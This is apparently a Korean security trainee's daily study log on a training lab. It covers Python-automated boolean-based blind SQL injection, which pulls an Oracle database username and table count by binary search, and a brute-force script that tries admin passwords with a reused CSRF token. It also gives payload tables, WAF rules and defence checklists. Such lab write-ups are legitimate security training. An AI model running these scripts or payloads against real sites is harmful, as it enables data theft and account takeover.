# 📄 2026.01.30 (Day 67) - Python을 활용한 Blind SQL Injection 자동화 공격

---

## 1. 핵심 개념 정리

### Blind SQL Injection 공격 기법

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 1 | **Blind SQL Injection** | 쿼리 결과가 직접 반환되지 않고 참/거짓 반응으로만 데이터를 추출하는 기법 | 일반 SQL Injection보다 탐지가 어렵고 자동화 도구 없이는 공격이 비효율적 |
| 2 | **Boolean-based Blind** | 조건문의 참/거짓 결과에 따라 페이지 응답이 달라지는 것을 이용 | 정상 응답과 비정상 응답의 패턴 차이로 탐지 가능 |
| 3 | **Binary Search(이진탐색)** | 1~127 범위를 매번 절반으로 나눠 7~8회 만에 ASCII 값 특정 | 공격 시간을 획기적으로 단축 (127회 → 7회) |
| 4 | **Oracle vs MySQL 차이** | Oracle: `user`, `substr()` / MySQL: `user()`, `substring()` | DBMS별 함수 차이를 이용한 핑거프린팅 가능 |
| 5 | **Brute Force 공격** | 가능한 모든 조합을 시도하여 비밀번호를 찾는 무차별 대입 공격 | 계정 잠금 정책, rate limiting으로 방어 필요 |

### Python requests 모듈 활용

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 6 | **requests.get()** | HTTP GET 요청을 보내고 응답을 받는 메서드 | URL 파라미터를 통한 SQL Injection 자동화에 활용 |
| 7 | **requests.post()** | HTTP POST 요청으로 데이터를 전송하는 메서드 | 로그인 폼, 검색 등 POST 기반 공격 자동화 |
| 8 | **Cookie/Header 설정** | 세션 유지를 위한 쿠키, 요청 헤더 커스터마이징 | 인증이 필요한 페이지 공격 시 필수 |
| 9 | **응답 텍스트 분석** | `응답.text`에서 특정 문자열 포함 여부로 참/거짓 판단 | "New MacBook Pro" 같은 정상 응답 마커 활용 |
| 10 | **반복문 자동화** | for, while을 이용한 대량 요청 자동 전송 | 수동으로는 불가능한 속도로 데이터 추출 |

### SQL Injection 공격 포인트 탐지

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 11 | **검색창 공격** | `like '%검색어%'` 구문에서 `%' or 'e'='q%` 삽입 | 가장 흔한 공격 벡터, 입력값 검증 필수 |
| 12 | **상세페이지 ID 파라미터** | `?id=62` 파라미터에 `and (공격쿼리)` 추가 | 숫자형 파라미터도 문자열 검증 우회 가능 |
| 13 | **로그인 폼 우회** | `_csrf` 토큰 재사용, 세션 유지로 무차별 대입 | CSRF 토큰도 제대로 검증 안 하면 무용지물 |
| 14 | **에러 메시지 분석** | "권한이 없습니다", "로그인 실패" 등 응답 차이 활용 | 에러 메시지 통일로 정보 노출 최소화 필요 |
| 15 | **쿼리 구조 유추** | 공격 성공 패턴으로 백엔드 쿼리문 역추적 | 개발자가 작성한 쿼리 구조 파악으로 정밀 공격 |

---

## 2. 실습 내용 정리

### 실습 1: 이진탐색 알고리즘 구현

**목표:** ASCII 값을 7~8회 만에 찾는 효율적 탐색 알고리즘 이해

**실습 환경:**
- Python 3.x
- 탐색 범위: 1~127 (ASCII 문자 범위)
- 테스트 값: 1 (실제로는 동적으로 변경)

**실습 단계:**
```python
# 1. 초기 범위 설정
아스키 = 1
시작점 = 1
끝점 = 127

# 2. 이진탐색 루프
while 시작점 < 끝점:
    중간점 = int((시작점+끝점)/2)
    
    # 3. 중간값과 비교
    if 아스키 > 중간점: 
        시작점 = 중간점 + 1  # 상위 절반 탐색
    else:
        끝점 = 중간점  # 하위 절반 탐색

# 4. 결과 출력
print(f"찾았따! {시작점}")
```

**분석 포인트:**
```
확인 항목:
✓ 127회 선형 탐색 → 7회 이진탐색으로 효율 극대화
✓ 중간점 계산: (시작+끝)/2를 정수로 변환
✓ 범위 좁히기: 참이면 시작점 상승, 거짓이면 끝점 하강
✓ 종료 조건: 시작점 == 끝점일 때 값 확정
```

**보안 인사이트:**
- 공격자 입장에서는 시간 효율성이 매우 중요 (빠른 데이터 탈취)
- 방어자 입장에서는 반복 요청 패턴 탐지가 핵심 (7~10회 규칙적 요청)
- 이진탐색 특유의 중간값 테스트 패턴을 WAF에서 시그니처로 활용 가능

### 실습 2: Blind SQL Injection 참/거짓 테스트

**목표:** 수동으로 Boolean-based Blind SQL Injection 원리 파악

**실습 환경:**
- 대상: `https://lab.eqst.co.kr:8110/practice/practice01/detail?id=62`
- DBMS: Oracle
- 세션: JSESSIONID 쿠키 유지

**실습 단계:**
```python
# 1. 쿠키 설정
쿠키 = {"JSESSIONID":"4819034DFB7E3211A4D82B79BBFDD433"}

# 2. 사용자 입력 공격 쿼리
쿼리 = input("공격쿼리: ")
주소 = f"https://lab.eqst.co.kr:8110/practice/practice01/detail?id=62 and ({쿼리})"

# 3. 요청 전송
응답 = requests.get(url=주소, cookies=쿠키)

# 4. 응답 분석
if "New MacBook Pro" in 응답.text: 
    print('참!')
else:
    print('거짓...')
```

**Boolean-based Blind 원리:**
```
동작 방식:
1. 정상 쿼리: SELECT * FROM 상품상세 WHERE 상품번호 = 62
   → "New MacBook Pro" 상품 정보 반환

2. 참 조건 삽입: WHERE 상품번호 = 62 and (length(user) > 0)
   → 조건이 참이면 동일하게 상품 정보 반환

3. 거짓 조건 삽입: WHERE 상품번호 = 62 and (1=2)
   → 조건이 거짓이면 아무것도 반환 안 됨
```

**발견 가능한 정보:**
- DB 사용자명 길이: `length(user) > X`
- 사용자명 각 문자: `ascii(substr(user,1,1)) > X`
- 테이블 개수: `(select count(table_name) from user_tables) > X`
- 권한 정보: `(select 1 from dual where user='SYSTEM')`

**보안 고려사항:**
```
탐지 패턴:
- 동일 IP에서 동일 URL로 수십~수백 회 반복 요청
- URL 파라미터에 SQL 함수명 포함 (length, substr, ascii)
- 응답 크기는 다르지만 HTTP 상태 코드는 200 OK

방어 방법:
→ Prepared Statement 사용으로 파라미터 바인딩
→ 입력값 화이트리스트 검증 (숫자 파라미터는 정수만)
→ 동일 세션의 반복 요청 횟수 제한 (rate limiting)
```

### 실습 3: 자동화 유저명 탈취 스크립트

**목표:** 이진탐색을 활용한 완전 자동화 데이터 추출

**실습 환경:**
- 대상: 쇼핑몰 1번 문제 (Oracle DB)
- 추출 대상: DB 유저명 완전 탈취
- 방법: 이진탐색 함수화 + 반복문 조합

**실습 단계:**
```python
# 1. 이진탐색 함수 정의
def 이진탐색(쿼리):    
    시작점 = 1
    끝점 = 127
    while 시작점 < 끝점:
        중간점 = int((시작점+끝점)/2)
        주소 = f"https://lab.eqst.co.kr:8110/practice/practice01/detail?id=62 and ({쿼리}) > {중간점}"
        응답 = requests.get(url=주소, cookies=쿠키)
        
        if "New MacBook Pro" in 응답.text: 
            시작점 = 중간점 + 1
        else:
            끝점 = 중간점 
    return 시작점

# 2. 유저명 길이 추출
글자수 = 이진탐색("length(user)")
print(f'유저명 글자수: {글자수}')

# 3. 각 글자 ASCII 값 추출 및 변환
for 글자순번 in range(1, 글자수+1):
    공격쿼리 = f"ascii(substr(user,{글자순번},1))"
    아스키 = 이진탐색(공격쿼리)
    print(chr(아스키))

# 4. 테이블 개수 확인
테이블수 = 이진탐색("select count(table_name) from user_tables")
print(f"테이블개수: {테이블수}개")
```

**자동화 효과:**
```
수동 vs 자동 비교:
- 수동: 5글자 유저명 추출에 5×127 = 635회 요청 필요
- 자동: 5글자 유저명 추출에 5×7 = 35회 요청 (약 18배 효율)
- 실행 시간: 수동 1시간 → 자동 10초 이내
```

**보안 인사이트:**
- 함수화로 재사용성 극대화 (유저명, 테이블명, 컬럼명 모두 동일 로직)
- 공격자는 이미 완전 자동화 도구 보유 (sqlmap 등)
- 수동 공격만 막는다고 안전한 게 아님, 근본적 취약점 제거 필요

### 실습 4: Brute Force 로그인 공격

**목표:** POST 요청 자동화로 비밀번호 무차별 대입

**실습 환경:**
- 대상: 쇼핑몰 2번 로그인 페이지
- 아이디: admin (고정)
- 비밀번호 범위: 0700~0999 (4자리 숫자)

**실습 단계:**
```python
# 1. 헤더 및 쿠키 설정
주소 = "https://lab.eqst.co.kr:8110/practice/practice02/login"
헤더 = {"Content-Type": "application/x-www-form-urlencoded"}
쿠키 = {"JSESSIONID":"5A0C0BB2B9AE773A4B728AD5F8B27155"}

# 2. 기본 데이터 템플릿
데이터 = {
    "_csrf":"9b23550c-9d60-4b7a-80d8-461a9c0fd4a7",
    "memberid":"admin",
    "password":"0002"
}

# 3. 비밀번호 범위 브루트포싱
for i in range(700,1000):
    pw = str(i).zfill(4)  # 0700, 0701, ... 형식
    데이터["password"] = pw
    응답 = requests.post(url=주소, headers=헤더, cookies=쿠키, data=데이터)
    
    # 4. 성공 여부 판단
    if '로그인에 실패했습니다.' in 응답.text:
        print(f'{pw} 비밀번호 틀림!!!')
    else:
        print(f'비밀번호 찾았다! {pw} !!!!!!!! ')
        break
```

**발견 가능한 취약점:**
- CSRF 토큰 재사용 가능 (토큰 갱신 없음)
- 계정 잠금 정책 부재 (무제한 시도 가능)
- Rate Limiting 없음 (초당 수십 회 요청 가능)
- 실패 응답 명확히 노출 (공격자에게 힌트 제공)

**보안 고려사항:**
```
탐지 패턴:
- 동일 계정으로 짧은 시간 내 다수 로그인 시도
- 순차적 비밀번호 패턴 (0700, 0701, 0702...)
- 동일 IP/세션에서 CSRF 토큰 재사용

방어 방법:
→ 5회 실패 시 계정 임시 잠금 (15분)
→ CAPTCHA 추가 (자동화 방지)
→ CSRF 토큰 매 요청마다 재생성
→ IP 기반 Rate Limiting (1분당 10회)
```

---

## 3. 공격 기법 비교 표

### SQL Injection vs Brute Force 비교

| 항목 | **Blind SQL Injection** | **Brute Force** | **일반 SQL Injection** | 사용 시기/적용 방안 |
|:---:|:---|:---|:---|:---|
| **공격 대상** | DB 쿼리 결과 간접 추출 | 인증 시스템 직접 공격 | DB 직접 결과 조회 | SQL Injection은 데이터 탈취, Brute Force는 계정 탈취 |
| **탐지 난이도** | 높음 (에러 없이 정상 요청) | 중간 (로그 패턴 명확) | 낮음 (에러 메시지 노출) | Blind는 WAF 우회 용이, 일반은 시그니처 탐지 쉬움 |
| **공격 속도** | 느림 (수십~수백 회 요청) | 빠름 (단순 반복) | 빠름 (1~2회 성공) | 시간 제약 없으면 Blind도 충분히 효과적 |
| **필요 조건** | SQL 취약점 존재 | 약한 비밀번호 정책 | SQL 에러 메시지 노출 | 취약점 종류에 따라 기법 선택 |

### DBMS별 함수 차이

| 예시 | **Oracle** | **MySQL** | **SQLite** | 보안 영향 |
|:---|:---|:---|:---|:---|
| 사용자 조회 | `user` | `user()` | N/A | DB 핑거프린팅 가능 |
| 문자열 추출 | `substr(str,1,1)` | `substring(str,1,1)` | `substr(str,1,1)` | 함수명 차이로 DBMS 식별 |
| 문자열 길이 | `length(str)` | `length(str)` | `length(str)` | 공통 함수는 범용 공격 가능 |
| 테이블 목록 | `user_tables` | `information_schema.tables` | `sqlite_master` | 메타 정보 위치 차이 |

---

## 4. 심화 분석

### Python 자동화 스크립트 구조 분석

| 구분 | 이진탐색 함수 | 반복문 로직 | 응답 분석 | 분석/인사이트 |
|:---:|:---|:---|:---|:---|
| **핵심 역할** | ASCII 값 7회 만에 특정 | 글자 수만큼 반복 호출 | 참/거짓 판별 기준 | 세 요소가 유기적으로 결합되어 완전 자동화 |
| **재사용성** | 모든 수치 추출에 활용 | 문자열 길이만큼 동적 | 응답 마커만 변경 | 함수화로 코드 중복 최소화 |
| **성능 영향** | O(log n) 복잡도 | O(n) 글자 수 | O(1) 문자열 검색 | 전체 성능은 O(n log m), n=글자수, m=ASCII범위 |

### 취약점 시나리오 코드 예시
```python
# [Boolean-based Blind SQL Injection]
# 취약한 쿼리:
query = f"SELECT * FROM products WHERE id = {user_input}"
# 공격:
user_input = "62 and ascii(substr(user,1,1)) > 64"
# 결과: DB 사용자명 첫 글자 ASCII 값이 64보다 큰지 확인 가능

# [Brute Force 로그인]
# 취약한 코드:
if username == "admin" and password == db_password:
    login_success()
# 공격:
for pw in range(0000, 10000):
    try_login("admin", str(pw).zfill(4))
# 결과: 계정 잠금 없으면 모든 조합 시도 가능


# [방어 기법 - Prepared Statement]
# 안전한 코드:
cursor.execute("SELECT * FROM products WHERE id = ?", (user_input,))
# 결과: 파라미터 바인딩으로 SQL 구문 분리, 인젝션 불가능
```

---

## 5. 실무/보안 적용

### 보안 전문가 관점 - 탐지/대응 포인트

| 단계/유형 | 탐지 포인트 | 로그 예시 | 대응 방안 |
|:---:|:---|:---|:---|
| **Blind SQL Injection** | - 동일 세션 반복 요청 (50+)<br>- URL에 SQL 함수 포함<br>- 응답 크기 일정하나 빈도 높음 | `GET /detail?id=62 and (length(user))>5` | - WAF 룰셋에 SQL 함수 시그니처 추가<br>- 세션별 동일 URL 요청 제한<br>- 개발팀에 파라미터 바인딩 적용 요청 |
| **Brute Force** | - 동일 계정 다수 로그인 실패<br>- 순차적 비밀번호 패턴<br>- 단시간 대량 POST 요청 | `POST /login password=0700,0701,0702` | - 5회 실패 시 15분 계정 잠금<br>- CAPTCHA 또는 2FA 적용<br>- 비밀번호 복잡도 정책 강화 |
| **자동화 도구 사용** | - User-Agent: Python-requests<br>- 일정한 요청 간격 (자동화)<br>- CSRF 토큰 재사용 패턴 | `User-Agent: python-requests/2.28.0` | - User-Agent 검증 (비정상 차단)<br>- Rate Limiting 적용<br>- CSRF 토큰 매 요청 재생성 |

### WAF 룰셋 예시
```bash
# ModSecurity 룰셋 예시

# 1. SQL 함수 탐지
SecRule ARGS "@rx (?i)(length|substr|ascii|substring|concat|user)" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection Attempt'"

# 2. 반복 요청 제한
SecAction "id:1002,phase:1,nolog,pass,initcol:ip=%{REMOTE_ADDR},\
    setvar:ip.counter=+1,expirevar:ip.counter=60"
SecRule IP:COUNTER "@gt 30" \
    "id:1003,phase:1,deny,status:429,msg:'Rate Limit Exceeded'"

# 3. Python requests User-Agent 차단
SecRule REQUEST_HEADERS:User-Agent "@rx python-requests" \
    "id:1004,phase:1,deny,status:403,msg:'Automated Tool Detected'"
```

### 웹 애플리케이션 보안 체크리스트
```bash
# SQL Injection 방어 체크리스트

# 1. Prepared Statement 사용
✓ 모든 DB 쿼리를 파라미터 바인딩으로 변경
✓ ORM 사용 시에도 raw query 금지

# 2. 입력값 검증
✓ 화이트리스트 기반 검증 (숫자는 isdigit() 확인)
✓ 특수문자 필터링 (',",;,--,/* 등)

# 3. 에러 메시지 숨김
✓ 프로덕션 환경에서 상세 SQL 에러 비노출
✓ 일반적 에러 메시지로 통일

# 4. 최소 권한 원칙
✓ DB 계정은 필요한 테이블만 접근 가능
✓ 웹 애플리케이션 계정으로 system 테이블 조회 불가

# 5. WAF 적용
✓ OWASP ModSecurity Core Rule Set 적용
✓ 커스텀 룰로 애플리케이션 특성 반영
```

---

## 6. 배운 점 및 인사이트

### 새로 알게 된 점

- **이진탐색의 실전 활용:** 단순 알고리즘 문제가 아니라 실제 공격 효율성을 127배 향상시키는 핵심 기술임을 체감
- **Python requests 모듈의 강력함:** HTTP 통신을 완전 자동화할 수 있어 수동으로 불가능한 공격도 스크립트로 실현 가능
- **Blind SQL Injection의 정교함:** 에러 메시지 없이도 참/거짓 응답 차이만으로 모든 데이터를 추출할 수 있다는 점이 놀라움
- **DBMS별 함수 차이 활용:** Oracle의 `user`와 MySQL의 `user()` 차이로 대상 시스템을 핑거프린팅하는 기법
- **자동화 스크립트의 필수성:** 현대 공격은 이미 완전 자동화되어 있으며, 보안 전문가도 자동화 도구를 다룰 줄 알아야 함

### 이전 학습과의 연결고리

- **SQL Injection 기초와 연계:** Union-based, Error-based에서 학습한 SQL 함수들을 Blind 공격에서도 그대로 활용
- **SIEM 로그 분석 확장:** 이전에 배운 로그 분석 기법으로 오늘 실습한 공격 패턴들을 탐지하는 룰셋 작성 가능
- **웹 취약점 스캐너 → 자동화 공격:** DNA Lab에서 구현한 자동 스캐너 원리가 오늘 Blind SQL 자동화와 동일한 메커니즘

### 실무 적용 아이디어

**보안 전문가 관점:**
- **공격 시뮬레이션 자동화:** 오늘 배운 스크립트 기법으로 모의해킹 시 반복 작업 자동화 가능
- **SIEM 탐지 룰 검증:** 직접 공격 스크립트를 돌려보고 Wazuh/Splunk에서 제대로 탐지되는지 테스트
- **취약점 재현 PoC 작성:** 발견한 취약점을 개발팀에 전달할 때 Python 스크립트로 명확히 재현 가능

**침해사고 대응 관점:**
- **로그 패턴 분석 자동화:** 침해사고 발생 시 로그에서 이진탐색 패턴, 순차 비밀번호 시도 등을 자동 탐지하는 스크립트 작성
- **공격자 IP 추적:** requests 라이브러리 특유의 User-Agent 패턴으로 자동화 공격 IP를 빠르게 식별

---

## 7. Quick Reference

### Python requests 자동화 명령어 모음
```python
# GET 요청 기본
응답 = requests.get(url="https://example.com", cookies=쿠키)

# POST 요청 (로그인)
응답 = requests.post(url=주소, headers=헤더, data=데이터)

# 응답 분석
if "특정문자열" in 응답.text:
    print("조건 만족")

# 이진탐색 구현
while 시작점 < 끝점:
    중간점 = int((시작점+끝점)/2)
    if 조건:
        시작점 = 중간점 + 1
    else:
        끝점 = 중간점

# 반복문 + zfill (숫자 패딩)
for i in range(700, 1000):
    pw = str(i).zfill(4)  # 0700, 0701...
```

### Blind SQL Injection 페이로드 요약표

| 구분 | Oracle | MySQL | 핵심 키워드 | 적용 방법 |
|:---:|:---|:---|:---|:---|
| **사용자명** | `length(user)` | `length(user())` | DB 계정 확인 | `and length(user)>5` |
| **문자 추출** | `ascii(substr(user,1,1))` | `ascii(substring(user(),1,1))` | 한 글자씩 ASCII | `and ascii(substr(...))>64` |
| **테이블 수** | `count(table_name) from user_tables` | `count(*) from information_schema.tables` | 메타 정보 | `and (select count(*))>10` |
| **컬럼 존재** | `count(*) from 테이블 where 컬럼 is not null` | 동일 | 특정 컬럼 유무 | `and (select count(*) from...)>0` |

### 공격 탐지 체크리스트

**WAF 룰셋:**
- [x] SQL 함수 시그니처 (length, substr, ascii)
- [x] 반복 요청 패턴 (30회/분 이상)
- [x] Python requests User-Agent 차단
- [x] 파라미터에 괄호/논리 연산자 포함

**애플리케이션 방어:**
- [x] Prepared Statement 사용
- [x] 입력값 화이트리스트 검증
- [x] 에러 메시지 일반화
- [x] 계정 잠금 정책 (5회 실패)

**로그 모니터링:**
- [x] 동일 세션 50+ 요청
- [x] SQL 함수명 포함 URL
- [x] 로그인 연속 실패 패턴
- [x] CSRF 토큰 재사용 시도

---

## 8. 트러블슈팅

| 문제 | 원인 | 해결 방법 |
|:---|:---|:---|
| "권한이 없습니다" 응답 | 쿼리 구문 오류로 DB 에러 발생 | - 괄호 닫기 확인<br>- 쿼리 문법 재검증<br>- 테스트 환경에서 먼저 검증 |
| 이진탐색이 무한루프 | `시작점 < 끝점` 조건 미충족 | - 초기 범위 확인 (1~127)<br>- 중간점 계산 로직 검증<br>- 디버깅 print로 값 추적 |
| 세션 만료 에러 | JSESSIONID 쿠키 유효기간 초과 | - 브라우저에서 새 세션 복사<br>- 스크립트에 세션 갱신 로직 추가<br>- 타임아웃 시간 단축 |
| zfill() 적용 안 됨 | str() 변환 누락 | - `str(i).zfill(4)` 순서 확인<br>- int를 먼저 str로 변환 후 zfill |

---

**Today's Insight:**

오늘 실습을 통해 공격자가 얼마나 효율적으로 데이터를 탈취할 수 있는지 몸소 체감했다. 단순해 보이는 이진탐색 알고리즘이 실제 공격에서는 시간을 127배 단축시키는 게임 체인저였고, Python 몇 줄로 수백 번의 요청을 자동화하니 수동 공격과는 차원이 달랐다. 특히 Blind SQL Injection은 에러 메시지조차 없는데도 참/거짓 응답 차이만으로 모든 걸 추출할 수 있다는 점에서, 방어자는 단순히 에러 메시지만 숨긴다고 안전한 게 아니라는 걸 깨달았다. 앞으로 보안 전문가로서 이런 자동화 공격 패턴을 SIEM에서 탐지하고, 개발팀에게는 Prepared Statement의 중요성을 설득할 수 있는 근거를 확보했다는 점에서 매우 값진 하루였다.